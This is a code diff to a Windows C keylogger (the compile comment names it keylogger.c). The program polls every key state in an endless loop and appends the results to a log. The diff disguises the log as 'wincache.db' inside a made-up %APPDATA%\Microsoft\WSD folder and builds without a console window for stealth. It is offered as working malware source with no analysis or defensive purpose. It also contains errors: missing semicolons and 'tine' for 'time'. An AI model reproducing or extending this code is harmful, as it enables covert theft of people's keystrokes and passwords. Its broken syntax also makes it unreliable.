@@ -1,19 +1,25 @@
 #include <windows.h>
 #include <stdlib.h>
 #include <time.h>
+#include <shlobj.h>
 
 int main() {
     HANDLE f;
     DWORD w;
     char c;
+    char path[MAX_PATH];
 
-    srand((unsigned int)time(0));
-
-    f = CreateFileA("wincache.db", FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path); // gets %APPDATA%
+    lstrcatA(path, "\\Microsoft\\WSD")
+    CreateDirectoryA(path, 0);
+    lstrcatA(path, "\\wincache.db");
+    
+    f = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
     if (f == INVALID_HANDLE_VALUE) {
         return 1;
     }
 
+    srand((unsigned int)tine(NULL))
     while (1) {
         for (short k = 8; k < 256; k++) {
             SHORT s = GetAsyncKeyState(k);
@@ -29,3 +35,4 @@ int main() {
     return 0;
 }
 // 0, = NULL
+// Compile with: cl /W4 /O2 /link /SUBSYSTEM:WINDOWS keylogger.c
